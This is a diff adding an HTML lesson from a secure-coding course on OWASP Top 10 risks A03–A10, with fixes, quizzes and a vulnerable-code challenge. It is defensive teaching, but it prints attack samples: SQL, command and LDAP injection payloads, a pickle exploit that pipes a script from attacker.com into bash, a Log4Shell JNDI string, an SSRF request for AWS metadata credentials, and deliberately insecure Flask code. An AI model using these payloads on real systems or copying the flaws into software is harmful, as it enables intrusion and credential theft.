+          <div class="owasp-header" onclick="toggle('a03')">
+            <span class="owasp-num risk-critical">A03</span>
+            <span class="owasp-title">Injection</span>
+            <span class="owasp-cwe">CWE-73, 89, 564, 917</span>
+            <span class="owasp-toggle">▼</span>
+          </div>
+          <div class="owasp-body">
+            <p class="owasp-desc">Injection occurs when untrusted data is sent to an interpreter as part of a command or query. SQL injection is the most famous, but the category also covers LDAP injection, OS command injection, XSS (HTML injection), and template injection. The root cause is always the same: user data is treated as code.</p>
+
+            <div class="impact-row">
+              <span class="pill pill-red">Database Dump</span>
+              <span class="pill pill-red">Authentication Bypass</span>
+              <span class="pill pill-red">Remote Code Execution</span>
+              <span class="pill pill-yellow">Data Manipulation</span>
+            </div>
+
+            <h4>Types of injection you must know</h4>
+            <table>
+              <tr><th>Type</th><th>Interpreter</th><th>Classic payload</th></tr>
+              <tr><td style="color:var(--red)">SQL Injection</td><td>Database engine</td><td>' OR '1'='1</td></tr>
+              <tr><td style="color:var(--red)">OS Command Injection</td><td>Shell / OS</td><td>; cat /etc/passwd</td></tr>
+              <tr><td style="color:var(--red)">SSTI (Template)</td><td>Template engine</td><td>{{7*7}} → 49 rendered</td></tr>
+              <tr><td style="color:var(--yellow)">LDAP Injection</td><td>LDAP server</td><td>*)(uid=*))(|(uid=*</td></tr>
+              <tr><td style="color:var(--yellow)">XPath Injection</td><td>XML processor</td><td>' or 1=1 or ''='</td></tr>
+              <tr><td style="color:var(--muted)">Log Injection</td><td>Log parser/SIEM</td><td>Inject fake log entries</td></tr>
+            </table>
+
+            <h4>SQL Injection — full attack walkthrough</h4>
+<pre><span class="c-muted"># STEP 1 — Vulnerable code</span>
+<span class="c-blue">def</span> <span class="c-green">login</span>(username, password):
+<span class="line-bad">    query = <span class="c-yellow">f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"</span></span>
+    result = db.execute(query)
+    <span class="c-blue">return</span> result.<span class="c-blue">fetchone</span>()
+
+<span class="c-muted"># STEP 2 — Normal query (harmless)</span>
+<span class="c-muted"># username = "alice"  →  WHERE username='alice' AND password='secret'</span>
+
+<span class="c-muted"># STEP 3 — Attacker input (authentication bypass)</span>
+<span class="c-muted"># username = "' OR '1'='1' --"</span>
+<span class="c-muted"># password = "anything"</span>
+<span class="c-muted"># Query becomes: WHERE username='' OR '1'='1' --' AND password='...'</span>
+<span class="c-muted"># The -- comments out password check → logs in as first user (often admin!)</span>
+
+<span class="c-muted"># STEP 4 — More dangerous: data extraction</span>
+<span class="c-muted"># username = "' UNION SELECT username, password, null FROM users --"</span>
+<span class="c-muted"># Dumps entire users table into the response!</span></pre>
+
+            <h4>Fixed — parameterized queries (THE fix for SQLi)</h4>
+<pre><span class="c-blue">def</span> <span class="c-green">login_safe</span>(username, password):
+<span class="line-good">    query = <span class="c-yellow">"SELECT * FROM users WHERE username=? AND password=?"</span></span>
+<span class="line-good">    result = db.execute(query, (username, password))   <span class="c-muted"># values passed separately</span></span>
+    <span class="c-blue">return</span> result.<span class="c-blue">fetchone</span>()
+
+<span class="c-muted"># Even if attacker passes: "' OR '1'='1' --"</span>
+<span class="c-muted"># DB treats it as a literal string to compare, NOT as SQL syntax</span>
+<span class="c-muted"># Query: WHERE username = "' OR '1'='1' --"  → finds no user → login fails</span></pre>
+
+            <div class="callout callout-warn">
+              <div class="callout-icon">⚠️</div>
+              <div class="callout-text"><strong>ORM ≠ safe by default:</strong> Even SQLAlchemy can be vulnerable if you use <code>text()</code> with string formatting. Always use ORM query methods OR parameterized queries — never build SQL strings manually.</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- A04 -->
+        <div class="owasp-card" id="a04">
+          <div class="owasp-header" onclick="toggle('a04')">
+            <span class="owasp-num risk-high">A04</span>
+            <span class="owasp-title">Insecure Design</span>
+            <span class="owasp-cwe">CWE-73, 183, 209, 256, 501, 522</span>
+            <span class="owasp-toggle">▼</span>
+          </div>
+          <div class="owasp-body">
+            <p class="owasp-desc"><strong>New in 2021.</strong> This is about missing or ineffective security controls in the design — before a single line of code is written. Insecure design cannot be fixed by better implementation. You can write perfect code for a flawed design and still be vulnerable. This is why Secure SDLC and Threat Modeling exist.</p>
+
+            <h4>Examples of insecure design (not implementation bugs)</h4>
+            <table>
+              <tr><th>Design flaw</th><th>Why it's insecure by design</th></tr>
+              <tr><td style="color:var(--red)">Password recovery via security questions</td><td>Security questions are guessable/findable online. No amount of coding fixes a bad recovery design</td></tr>
+              <tr><td style="color:var(--red)">No rate limiting in the design</td><td>If the architecture doesn't plan for rate limiting, credential stuffing attacks succeed</td></tr>
+              <tr><td style="color:var(--yellow)">Single-factor auth for sensitive ops</td><td>Financial transfers without MFA is a design decision, not an implementation bug</td></tr>
+              <tr><td style="color:var(--yellow)">Storing card numbers "for convenience"</td><td>Storing CVV numbers at all is an insecure design choice — PCI-DSS prohibits it</td></tr>
+            </table>
+
+            <h4>The fix: Threat Modeling in design phase</h4>
+            <div class="attack-flow">
+              <div class="flow-step">Requirements</div>
+              <div class="flow-arrow">→</div>
+              <div class="flow-step good">Threat Model</div>
+              <div class="flow-arrow">→</div>
+              <div class="flow-step good">Security Requirements</div>
+              <div class="flow-arrow">→</div>
+              <div class="flow-step">Design</div>
+              <div class="flow-arrow">→</div>
+              <div class="flow-step">Code</div>
+            </div>
+            <p style="font-size:13px;color:var(--muted);margin-top:0.5rem;">Ask "what could go wrong?" at every step using STRIDE. We cover this in full in Lesson 3: Threat Modeling.</p>
+          </div>
+        </div>
+
+        <!-- A05 -->
+        <div class="owasp-card" id="a05">
+          <div class="owasp-header" onclick="toggle('a05')">
+            <span class="owasp-num risk-high">A05</span>
+            <span class="owasp-title">Security Misconfiguration</span>
+            <span class="owasp-cwe">CWE-2, 11, 13, 15, 16, 260, 315, 520, 526, 537, 538, 547</span>
+            <span class="owasp-toggle">▼</span>
+          </div>
+          <div class="owasp-body">
+            <p class="owasp-desc">The most common finding in real pentests. Security misconfiguration means the system is set up insecurely — default credentials, debug modes left on, overly permissive CORS, missing security headers, cloud storage buckets left public, verbose error messages exposing stack traces.</p>
+
+            <h4>Common misconfigurations by layer</h4>
+            <table>
+              <tr><th>Layer</th><th>Misconfiguration</th><th>Impact</th></tr>
+              <tr><td>Application</td><td>Debug mode on in production</td><td>Stack traces, env vars, source code exposed</td></tr>
+              <tr><td>Application</td><td>Default credentials (admin/admin)</td><td>Instant admin access</td></tr>
+              <tr><td>HTTP Headers</td><td>Missing CSP, X-Frame-Options, HSTS</td><td>XSS, clickjacking, downgrade attacks</td></tr>
+              <tr><td>Cloud</td><td>S3 bucket public read</td><td>All files accessible to anyone</td></tr>
+              <tr><td>Cloud</td><td>Overly permissive IAM role</td><td>Lateral movement, data access</td></tr>
+              <tr><td>Database</td><td>DB port open to internet</td><td>Direct DB attacks</td></tr>
+            </table>
+
+            <h4>HTTP Security Headers — the ones you must know</h4>
+<pre><span class="c-muted"># Add to every HTTP response in Flask:</span>
+
+<span class="c-purple">@app.after_request</span>
+<span class="c-blue">def</span> <span class="c-green">add_security_headers</span>(response):
+<span class="line-good">    response.headers[<span class="c-yellow">'Content-Security-Policy'</span>] = <span class="c-yellow">"default-src 'self'"</span></span>
+<span class="line-good">    response.headers[<span class="c-yellow">'X-Frame-Options'</span>] = <span class="c-yellow">'DENY'</span>               <span class="c-muted"># Prevent clickjacking</span></span>
+<span class="line-good">    response.headers[<span class="c-yellow">'X-Content-Type-Options'</span>] = <span class="c-yellow">'nosniff'</span>      <span class="c-muted"># Prevent MIME sniffing</span></span>
+<span class="line-good">    response.headers[<span class="c-yellow">'Strict-Transport-Security'</span>] = <span class="c-yellow">'max-age=31536000; includeSubDomains'</span></span>
+<span class="line-good">    response.headers[<span class="c-yellow">'Referrer-Policy'</span>] = <span class="c-yellow">'no-referrer'</span></span>
+<span class="line-good">    response.headers[<span class="c-yellow">'Permissions-Policy'</span>] = <span class="c-yellow">'camera=(), microphone=(), geolocation=()'</span></span>
+    <span class="c-blue">return</span> response</pre>
+          </div>
+        </div>
+
+        <!-- A06 -->
+        <div class="owasp-card" id="a06">
+          <div class="owasp-header" onclick="toggle('a06')">
+            <span class="owasp-num risk-high">A06</span>
+            <span class="owasp-title">Vulnerable & Outdated Components</span>
+            <span class="owasp-cwe">CWE-1035, 1104</span>
+            <span class="owasp-toggle">▼</span>
+          </div>
+          <div class="owasp-body">
+            <p class="owasp-desc">Using libraries, frameworks, or OS components with known vulnerabilities. Modern applications are 80% third-party code. One vulnerable transitive dependency can compromise the entire app. Log4Shell (CVE-2021-44228) affected half the internet because one logging library had an RCE vulnerability — and most teams didn't even know they were using it.</p>
+
+            <div class="rw-box">
+              <div class="rw-title">🔴 Log4Shell — CVE-2021-44228 (CVSS 10.0)</div>
+              <p>A single Java logging library (Log4j) had a flaw where logging a crafted string like <code>${jndi:ldap://attacker.com/exploit}</code> would trigger remote code execution. Apache, Apple, Twitter, Amazon, Cloudflare — all affected. Attackers just needed to get this string logged anywhere in the app. Fix: update Log4j from 2.14 to 2.15.</p>
+            </div>
+
+            <h4>Your defense: automated SCA scanning</h4>
+<pre><span class="c-muted"># Run this in CI pipeline for Python projects:</span>
+$ pip install safety
+$ safety check                                       <span class="c-muted"># checks requirements.txt vs CVE DB</span>
+
+<span class="c-muted"># For Node.js:</span>
+$ npm audit
+
+<span class="c-muted"># For Java (Maven):</span>
+$ mvn dependency-check:check
+
+<span class="c-muted"># Enable Dependabot in GitHub (.github/dependabot.yml):</span>
+version: 2
+updates:
+  - package-ecosystem: <span class="c-yellow">"pip"</span>
+    directory: <span class="c-yellow">"/"</span>
+    schedule:
+      interval: <span class="c-yellow">"daily"</span>          <span class="c-muted"># auto-PRs for vulnerable deps</span></pre>
+          </div>
+        </div>
+
+        <!-- A07 -->
+        <div class="owasp-card" id="a07">
+          <div class="owasp-header" onclick="toggle('a07')">
+            <span class="owasp-num risk-high">A07</span>
+            <span class="owasp-title">Identification and Authentication Failures</span>
+            <span class="owasp-cwe">CWE-255, 259, 287, 288, 290, 294, 295, 297, 300, 302, 304, 306, 307, 346, 384, 521, 613, 620, 640, 798, 940, 1216</span>
+            <span class="owasp-toggle">▼</span>
+          </div>
+          <div class="owasp-body">
+            <p class="owasp-desc">Authentication is "who are you?" — if it can be bypassed or brute-forced, the attacker becomes you. This covers weak passwords, no MFA, broken session management, predictable session tokens, and credential stuffing attacks.</p>
+
+            <h4>Common auth failures</h4>
+            <table>
+              <tr><th>Failure</th><th>Attack</th><th>Fix</th></tr>
+              <tr><td style="color:var(--red)">No rate limiting on login</td><td>Brute force / credential stuffing</td><td>Account lockout + CAPTCHA after 5 fails</td></tr>
+              <tr><td style="color:var(--red)">Weak session token</td><td>Predict/forge token</td><td>Use cryptographically random 128-bit tokens</td></tr>
+              <tr><td style="color:var(--red)">Session not invalidated on logout</td><td>Reuse old token after logout</td><td>Server-side session invalidation on logout</td></tr>
+              <tr><td style="color:var(--yellow)">No MFA</td><td>Stolen password = account takeover</td><td>TOTP (Google Authenticator) or WebAuthn</td></tr>
+              <tr><td style="color:var(--yellow)">JWT with weak secret</td><td>Forge any JWT payload</td><td>256-bit random secret or RSA keys</td></tr>
+            </table>
+
+            <h4>Session token generation — wrong vs right</h4>
+            <div class="two-col">
+              <div class="compare-card bad-card">
+                <div class="card-title">❌ Predictable token</div>
+<pre style="margin:0;font-size:12px;background:transparent;border:none;padding:0;"><span class="c-blue">import</span> random
+<span class="c-blue">import</span> time
+
+<span class="c-blue">def</span> <span class="c-red">gen_session</span>():
+    <span class="c-muted"># VULNERABLE: time-based seed</span>
+    random.seed(int(time.time()))
+    token = str(random.randint(
+        100000, 999999
+    ))
+    <span class="c-blue">return</span> token
+<span class="c-muted"># Only 900000 possible values</span>
+<span class="c-muted"># Predictable if time is known</span></pre>
+              </div>
+              <div class="compare-card good-card">
+                <div class="card-title">✅ Cryptographically secure</div>
+<pre style="margin:0;font-size:12px;background:transparent;border:none;padding:0;"><span class="c-blue">import</span> secrets
+
+<span class="c-blue">def</span> <span class="c-green">gen_session</span>():
+    <span class="c-muted"># 256 bits of entropy</span>
+    <span class="c-muted"># from OS CSPRNG</span>
+    token = secrets.token_hex(<span class="c-orange">32</span>)
+    <span class="c-blue">return</span> token
+
+<span class="c-muted"># 2^256 possible values</span>
+<span class="c-muted"># Impossible to brute force</span>
+<span class="c-muted"># Use secrets module, NOT random</span></pre>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- A08 -->
+        <div class="owasp-card" id="a08">
+          <div class="owasp-header" onclick="toggle('a08')">
+            <span class="owasp-num risk-high">A08</span>
+            <span class="owasp-title">Software and Data Integrity Failures</span>
+            <span class="owasp-cwe">CWE-345, 353, 426, 494, 502, 565, 784, 829, 830, 913</span>
+            <span class="owasp-toggle">▼</span>
+          </div>
+          <div class="owasp-body">
+            <p class="owasp-desc"><strong>New in 2021.</strong> Covers two related problems: (1) trusting code/data that hasn't been verified for integrity — like loading a library from a CDN with no subresource integrity check, and (2) insecure deserialization — loading user-supplied serialized objects that can trigger code execution.</p>
+
+            <h4>Insecure deserialization — most dangerous example</h4>
+<pre><span class="c-blue">import</span> pickle
+
+<span class="c-muted"># A malicious serialized object:</span>
+<span class="c-blue">import</span> os, pickle
+
+<span class="c-blue">class</span> <span class="c-purple">Exploit</span>:
+    <span class="c-blue">def</span> <span class="c-green">__reduce__</span>(self):
+        <span class="c-muted"># This runs during deserialization!</span>
+        <span class="c-blue">return</span> (os.system, (<span class="c-yellow">'curl http://attacker.com/shell.sh | bash'</span>,))
+
+payload = pickle.dumps(Exploit())    <span class="c-muted"># attacker sends this as input</span>
+
+<span class="c-muted"># Victim server:</span>
+<span class="c-blue">def</span> <span class="c-green">process_cart</span>(data):
+<span class="line-bad">    cart = pickle.loads(data)          <span class="c-muted"># ← executes attacker's __reduce__ method!</span></span>
+    <span class="c-muted"># Remote code execution! Server is now compromised.</span>
+
+<span class="c-muted"># FIX: Never deserialize untrusted data with pickle.</span>
+<span class="c-muted"># Use JSON for data exchange — JSON cannot contain executable code.</span></pre>
+
+            <h4>Supply chain integrity — Subresource Integrity</h4>
+<pre><span class="c-muted">&lt;!-- VULNERABLE: loading CDN script with no integrity check --&gt;</span>
+<span class="line-bad">&lt;<span class="c-blue">script</span> <span class="c-green">src</span>=<span class="c-yellow">"https://cdn.example.com/jquery.min.js"</span>&gt;&lt;/<span class="c-blue">script</span>&gt;</span>
+
+<span class="c-muted">&lt;!-- If CDN is compromised, attacker injects malicious code --&gt;</span>
+
+<span class="c-muted">&lt;!-- FIXED: add integrity hash (SRI) --&gt;</span>
+<span class="line-good">&lt;<span class="c-blue">script</span>
+  <span class="c-green">src</span>=<span class="c-yellow">"https://cdn.example.com/jquery.min.js"</span>
+  <span class="c-green">integrity</span>=<span class="c-yellow">"sha256-abc123..."</span>   &lt;!-- browser verifies hash before executing --&gt;
+  <span class="c-green">crossorigin</span>=<span class="c-yellow">"anonymous"</span>&gt;&lt;/<span class="c-blue">script</span>&gt;</span></pre>
+          </div>
+        </div>
+
+        <!-- A09 -->
+        <div class="owasp-card" id="a09">
+          <div class="owasp-header" onclick="toggle('a09')">
+            <span class="owasp-num risk-medium">A09</span>
+            <span class="owasp-title">Security Logging and Monitoring Failures</span>
+            <span class="owasp-cwe">CWE-117, 223, 532, 778</span>
+            <span class="owasp-toggle">▼</span>
+          </div>
+          <div class="owasp-body">
+            <p class="owasp-desc">Without logging and monitoring, breaches go undetected. The average breach takes 207 days to detect (IBM Cost of a Data Breach 2023). Proper security logging means recording all authentication events, access control failures, and high-value transactions — and alerting on anomalies in real time.</p>
+
+            <h4>What to log vs what NOT to log</h4>
+            <div class="two-col">
+              <div class="compare-card good-card">
+                <div class="card-title">✅ Log these events</div>
+<pre style="margin:0;font-size:12px;background:transparent;border:none;padding:0;"><span class="c-muted"># Authentication events</span>
+login_success(user_id, ip, timestamp)
+login_failure(username, ip, timestamp)
+password_reset_requested(user_id)
+mfa_failure(user_id, ip)
+
+<span class="c-muted"># Access control failures</span>
+access_denied(user_id, resource, action)
+admin_action(user_id, action, target)
+
+<span class="c-muted"># Business logic</span>
+large_transaction(user_id, amount)
+bulk_export_requested(user_id, count)</pre>
+              </div>
+              <div class="compare-card bad-card">
+                <div class="card-title">❌ Never log these</div>
+<pre style="margin:0;font-size:12px;background:transparent;border:none;padding:0;"><span class="c-muted"># PII / sensitive data</span>
+log(f<span class="c-yellow">"Login: {username}:{password}"</span>)
+log(f<span class="c-yellow">"Card: {card_number}"</span>)
+log(f<span class="c-yellow">"SSN: {user.ssn}"</span>)
+
+<span class="c-muted"># Tokens / secrets</span>
+log(f<span class="c-yellow">"Token: {session_token}"</span>)
+log(f<span class="c-yellow">"Key: {api_key}"</span>)
+
+<span class="c-muted"># These logs themselves become</span>
+<span class="c-muted"># sensitive data stores — a new</span>
+<span class="c-muted"># target for attackers</span></pre>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- A10 -->
+        <div class="owasp-card" id="a10">
+          <div class="owasp-header" onclick="toggle('a10')">
+            <span class="owasp-num risk-medium">A10</span>
+            <span class="owasp-title">Server-Side Request Forgery (SSRF)</span>
+            <span class="owasp-cwe">CWE-918</span>
+            <span class="owasp-toggle">▼</span>
+          </div>
+          <div class="owasp-body">
+            <p class="owasp-desc"><strong>New in 2021.</strong> SSRF occurs when your server fetches a URL supplied by the user — and doesn't validate it. The attacker can make your server send requests to internal services, cloud metadata endpoints, and databases that are unreachable from the internet but reachable from your server.</p>
+
+            <h4>SSRF attack flow in a cloud environment</h4>
+            <div class="attack-flow">
+              <div class="flow-step bad">Attacker</div>
+              <div class="flow-arrow">→</div>
+              <div class="flow-step">POST url=http://</div>
+              <div class="flow-arrow">→</div>
+              <div class="flow-step bad">Your Server fetches it</div>
+              <div class="flow-arrow">→</div>
+              <div class="flow-step bad">169.254.169.254</div>
+              <div class="flow-arrow">→</div>
+              <div class="flow-step bad">AWS IAM Keys leaked!</div>
+            </div>
+
+<pre><span class="c-muted"># Vulnerable: user controls the URL your server fetches</span>
+<span class="c-purple">@app.route</span>(<span class="c-yellow">'/fetch-preview'</span>)
+<span class="c-blue">def</span> <span class="c-green">fetch_preview</span>():
+    url = request.args.<span class="c-blue">get</span>(<span class="c-yellow">'url'</span>)
+<span class="line-bad">    response = requests.<span class="c-blue">get</span>(url)         <span class="c-muted"># ← SSRF: no validation!</span></span>
+    <span class="c-blue">return</span> response.text
+
+<span class="c-muted"># Attack:</span>
+<span class="c-muted"># GET /fetch-preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/</span>
+<span class="c-muted"># Returns: {"AccessKeyId": "...", "SecretAccessKey": "..."}</span>
+<span class="c-muted"># Attacker now has AWS credentials — full cloud account access!</span>
+
+<span class="c-muted"># FIXED:</span>
+<span class="c-blue">import</span> ipaddress, socket
+<span class="c-blue">from</span> urllib.parse <span class="c-blue">import</span> urlparse
+
+BLOCKED = [<span class="c-yellow">'169.254.0.0/16'</span>, <span class="c-yellow">'10.0.0.0/8'</span>, <span class="c-yellow">'172.16.0.0/12'</span>, <span class="c-yellow">'192.168.0.0/16'</span>]
+
+<span class="c-blue">def</span> <span class="c-green">is_safe_url</span>(url):
+    host = urlparse(url).hostname
+    ip = ipaddress.ip_address(socket.gethostbyname(host))
+<span class="line-good">    <span class="c-blue">return not</span> any(ip <span class="c-blue">in</span> ipaddress.ip_network(b) <span class="c-blue">for</span> b <span class="c-blue">in</span> BLOCKED)</span></pre>
+
+            <div class="rw-box">
+              <div class="rw-title">🔴 Capital One Breach (2019) — 100 million records, $190M fine</div>
+              <p>The attacker exploited SSRF in a misconfigured WAF to hit the AWS metadata endpoint and steal IAM credentials. They then used those credentials to list and download 30GB of data from S3. The SSRF + cloud metadata endpoint combination is one of the most devastating attack chains in cloud security.</p>
+            </div>
+          </div>
+        </div>
+
+      </div><!-- /owasp-grid -->
+    </div>
+
+    <!-- QUIZ SECTION -->
+    <div class="section">
+      <div class="section-title">Knowledge Check</div>
+      <p class="section-sub">Test yourself before moving on — these questions appear in real AppSec interviews</p>
+
+      <div style="display:flex;flex-direction:column;gap:1.5rem;">
+
+        <div class="card" style="background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:1.25rem;">
+          <div class="quiz-q">Q1. An attacker passes <code>' OR 1=1 --</code> to a login field and authenticates without a valid password. Which OWASP 2021 category is this?</div>
+          <div class="quiz-options" id="q1">
+            <div class="quiz-opt" onclick="answer('q1',this,'wrong')">A01 — Broken Access Control</div>
+            <div class="quiz-opt" onclick="answer('q1',this,'correct')">A03 — Injection</div>
+            <div class="quiz-opt" onclick="answer('q1',this,'wrong')">A07 — Authentication Failures</div>
+            <div class="quiz-opt" onclick="answer('q1',this,'wrong')">A02 — Cryptographic Failures</div>
+          </div>
+          <div class="quiz-explain" id="q1-exp">SQL injection is always A03 — Injection. The attacker is injecting SQL code into an interpreter (the database engine). A07 would apply if the authentication logic itself was flawed (e.g., no rate limiting), but injection is the specific mechanism here.</div>
+        </div>
+
+        <div class="card" style="background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:1.25rem;">
+          <div class="quiz-q">Q2. A user changes their URL from <code>/profile/123</code> to <code>/profile/456</code> and sees another user's private data. Which OWASP 2021 category and sub-type is this?</div>
+          <div class="quiz-options" id="q2">
+            <div class="quiz-opt" onclick="answer('q2',this,'wrong')">A05 — Security Misconfiguration</div>
+            <div class="quiz-opt" onclick="answer('q2',this,'wrong')">A03 — Injection (Path Traversal)</div>
+            <div class="quiz-opt" onclick="answer('q2',this,'correct')">A01 — Broken Access Control (IDOR)</div>
+            <div class="quiz-opt" onclick="answer('q2',this,'wrong')">A07 — Identification Failures</div>
+          </div>
+          <div class="quiz-explain" id="q2-exp">This is IDOR — Insecure Direct Object Reference, a sub-type of Broken Access Control (A01). The object ID is exposed directly in the URL and the server doesn't verify that the requesting user owns that resource. Fix: always check resource.owner_id == current_user.id before returning data.</div>
+        </div>
+
+        <div class="card" style="background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:1.25rem;">
+          <div class="quiz-q">Q3. Your app makes a server-side HTTP request to a URL provided by the user. An attacker uses this to hit <code>http://169.254.169.254/latest/meta-data/</code> and steal AWS credentials. Which category?</div>
+          <div class="quiz-options" id="q3">
+            <div class="quiz-opt" onclick="answer('q3',this,'wrong')">A05 — Security Misconfiguration</div>
+            <div class="quiz-opt" onclick="answer('q3',this,'correct')">A10 — Server-Side Request Forgery (SSRF)</div>
+            <div class="quiz-opt" onclick="answer('q3',this,'wrong')">A03 — Injection</div>
+            <div class="quiz-opt" onclick="answer('q3',this,'wrong')">A08 — Software Integrity Failures</div>
+          </div>
+          <div class="quiz-explain" id="q3-exp">Classic SSRF (A10). The server fetches a URL on behalf of the user without validating that it's an internal/metadata endpoint. The 169.254.169.254 address is the AWS Instance Metadata Service — accessible from any EC2 instance but not from the internet. Fix: validate and block internal IP ranges before making any outbound request.</div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- CHALLENGE -->
+    <div class="challenge-section">
+      <h3>Hands-On Challenge — Fix the Vulnerable App</h3>
+      <p>The code below has <strong>4 different OWASP Top 10 vulnerabilities</strong>. Your job: identify each one (by A0X number), explain what the attack would be, and write the fix for each. Write your answers below the code.</p>
+
+<pre style="margin-bottom:1.25rem;"><span class="c-blue">from</span> flask <span class="c-blue">import</span> Flask, request, jsonify
+<span class="c-blue">import</span> sqlite3, hashlib, requests
+
+app = Flask(__name__)
+app.secret_key = <span class="c-yellow">"supersecretkey"</span>              <span class="c-muted"># Issue 1</span>
+
+<span class="c-purple">@app.route</span>(<span class="c-yellow">'/login'</span>, methods=[<span class="c-yellow">'POST'</span>])
+<span class="c-blue">def</span> <span class="c-green">login</span>():
+    user = request.json[<span class="c-yellow">'username'</span>]
+    pwd  = request.json[<span class="c-yellow">'password'</span>]
+    h    = hashlib.md5(pwd.encode()).hexdigest()  <span class="c-muted"># Issue 2</span>
+    query = <span class="c-yellow">f"SELECT * FROM users WHERE username='{user}' AND password='{h}'"</span>  <span class="c-muted"># Issue 3</span>
+    conn = sqlite3.connect(<span class="c-yellow">'users.db'</span>)
+    result = conn.execute(query).fetchone()
+    <span class="c-blue">return</span> jsonify({<span class="c-yellow">'user'</span>: result})
+
+<span class="c-purple">@app.route</span>(<span class="c-yellow">'/proxy'</span>)
+<span class="c-blue">def</span> <span class="c-green">proxy</span>():
+    url = request.args.<span class="c-blue">get</span>(<span class="c-yellow">'url'</span>)
+    r = requests.<span class="c-blue">get</span>(url)                          <span class="c-muted"># Issue 4</span>
+    <span class="c-blue">return</span> r.text</pre>
+
+      <textarea id="challenge-ans" placeholder="Issue 1 — Category: A0? — Attack: ... — Fix: ...
+Issue 2 — Category: A0? — Attack: ... — Fix: ...
+Issue 3 — Category: A0? — Attack: ... — Fix: ...
+Issue 4 — Category: A0? — Attack: ... — Fix: ..."></textarea>
+
+      <div class="btn-row">
+        <button class="btn btn-primary" onclick="checkChallenge()">Submit answer</button>
+        <button class="btn" onclick="showAnswer()">Reveal answer</button>
+      </div>
+      <div class="feedback-block" id="ch-feedback"></div>
+    </div>
+
+    <!-- SUMMARY TABLE -->
+    <div class="section">
+      <div class="section-title">Quick Reference — All 10 Risks</div>
+      <p class="section-sub">Memorize this table — you'll be asked to recite it</p>
+      <table>
+        <tr><th>#</th><th>Category</th><th>Root Cause</th><th>Primary Fix</th></tr>
+        <tr><td style="color:var(--red);font-family:'JetBrains Mono',monospace">A01</td><td>Broken Access Control</td><td>No ownership/role checks</td><td>Deny by default, check ownership</td></tr>
+        <tr><td style="color:var(--red);font-family:'JetBrains Mono',monospace">A02</td><td>Cryptographic Failures</td><td>Weak/missing encryption</td><td>bcrypt passwords, TLS, AES-256</td></tr>
+        <tr><td style="color:var(--red);font-family:'JetBrains Mono',monospace">A03</td><td>Injection</td><td>User data treated as code</td><td>Parameterized queries, output encoding</td></tr>
+        <tr><td style="color:var(--accent2);font-family:'JetBrains Mono',monospace">A04</td><td>Insecure Design</td><td>No security in design phase</td><td>Threat modeling, Secure SDLC</td></tr>
+        <tr><td style="color:var(--accent2);font-family:'JetBrains Mono',monospace">A05</td><td>Security Misconfiguration</td><td>Insecure defaults left on</td><td>Harden configs, security headers</td></tr>
+        <tr><td style="color:var(--accent2);font-family:'JetBrains Mono',monospace">A06</td><td>Vulnerable Components</td><td>Unpatched 3rd party code</td><td>SCA scanning, patch management</td></tr>
+        <tr><td style="color:var(--accent2);font-family:'JetBrains Mono',monospace">A07</td><td>Auth Failures</td><td>Weak session/auth logic</td><td>MFA, rate limiting, secure tokens</td></tr>
+        <tr><td style="color:var(--yellow);font-family:'JetBrains Mono',monospace">A08</td><td>Software Integrity Failures</td><td>Unverified code/data loaded</td><td>SRI, avoid pickle, sign artifacts</td></tr>
+        <tr><td style="color:var(--yellow);font-family:'JetBrains Mono',monospace">A09</td><td>Logging Failures</td><td>No audit trail</td><td>Log auth events, alert on anomalies</td></tr>
+        <tr><td style="color:var(--yellow);font-family:'JetBrains Mono',monospace">A10</td><td>SSRF</td><td>Server fetches attacker URL</td><td>Validate/block internal IP ranges</td></tr>
+      </table>
+    </div>
+
+    <!-- NAV FOOTER -->
+    <div class="lesson-nav-footer">
+      <div class="nav-prev">
+        <span>←</span>
+        <span style="color:var(--muted);font-size:13px;">Start of curriculum</span>
+      </div>
+      <div class="nav-next">
+        <span style="color:var(--muted);font-size:12px;">Next lesson →</span>
+        <span class="nav-label">02 — Secure SDLC Implementation</span>
+      </div>
+    </div>
+
+  </div><!-- /content -->
+</div><!-- /main -->
+
+<script>
+// Progress dots
+const dotsEl = document.getElementById('dots');
+for(let i=0;i<20;i++){
+  const d = document.createElement('div');
+  d.className = 'prog-dot' + (i===0?' active':'');
+  dotsEl.appendChild(d);
+}
+
+// Toggle OWASP cards
+function toggle(id){
+  const card = document.getElementById(id);
+  card.classList.toggle('open');
+}
+
+// Open A01 by default to show user how it works
+document.getElementById('a01').classList.add('open');
+
+// Quiz
+function answer(qid, el, result){
+  const container = document.getElementById(qid);
+  const opts = container.querySelectorAll('.quiz-opt');
+  opts.forEach(o => o.onclick = null);
+  if(result === 'correct'){
+    el.classList.add('selected-correct');
+  } else {
+    el.classList.add('selected-wrong');
+    opts.forEach(o => {
+      if(o.onclick === null && !o.classList.contains('selected-wrong')){
+        // find correct
+      }
+    });
+    // highlight correct
+    const allOpts = Array.from(opts);
+    // We'll just show explanation
+  }
+  document.getElementById(qid+'-exp').classList.add('show');
+}
+
+// Challenge
+function checkChallenge(){
+  const ans = document.getElementById('challenge-ans').value.toLowerCase();
+  const fb = document.getElementById('ch-feedback');
+  const checks = {
+    'A05 or misconfiguration': ans.includes('a05') || ans.includes('misconfiguration') || ans.includes('hardcoded'),
+    'A02 or cryptographic': ans.includes('a02') || ans.includes('md5') || ans.includes('bcrypt') || ans.includes('cryptograph'),
+    'A03 or injection': ans.includes('a03') || ans.includes('injection') || ans.includes('parameteriz') || ans.includes('sql'),
+    'A10 or ssrf': ans.includes('a10') || ans.includes('ssrf') || ans.includes('169.254') || ans.includes('server-side request'),
+  };
+  const found = Object.values(checks).filter(Boolean).length;
+  fb.className = 'feedback-block show ' + (found >= 3 ? 'good' : 'hint');
+  fb.innerHTML = found >= 4
+    ? '🎯 Perfect! You identified all 4 vulnerabilities correctly. You understand how OWASP categories map to real code flaws.'
+    : found >= 2
+    ? `✅ Good work — you found ${found}/4 issues. Review the ones you missed and try again. Hint: look at the secret_key, the hash function, the query string, and the URL fetch.`
+    : `⚠️ Keep trying — you found ${found}/4. Each line with a comment "Issue N" is a separate vulnerability. Map each to an A0X category.`;
+}
+
+function showAnswer(){
+  const fb = document.getElementById('ch-feedback');
+  fb.className = 'feedback-block show reveal';
